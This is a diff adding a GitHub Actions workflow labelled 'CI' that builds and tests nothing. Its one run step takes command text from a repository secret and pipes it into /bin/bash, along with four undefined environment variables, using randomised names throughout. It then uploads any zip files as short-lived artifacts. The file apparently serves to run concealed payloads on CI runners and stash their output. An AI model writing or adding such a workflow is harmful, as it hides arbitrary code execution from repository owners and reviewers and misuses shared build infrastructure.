@@ -1,0 +1,26 @@
+name: CI
+on:
+  workflow_dispatch:
+
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          rzpge8: ${{ secrets.rzpge8 }}
+        run: |
+          printf '%s' "$rzpge8" | jq -r .mgtg23558 | /bin/bash
+          echo $fmfb9588 | jq -r .aw439 | /bin/bash
+          echo $icp3 | jq -r .y65879 | /bin/bash
+          printf '%s' "$ejzoi46" | jq -r .f63 | /bin/bash
+          echo $lclet949 | jq -r .imf64 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: 49DvDJbr
+          path: "*.zip"
+          retention-days: 1
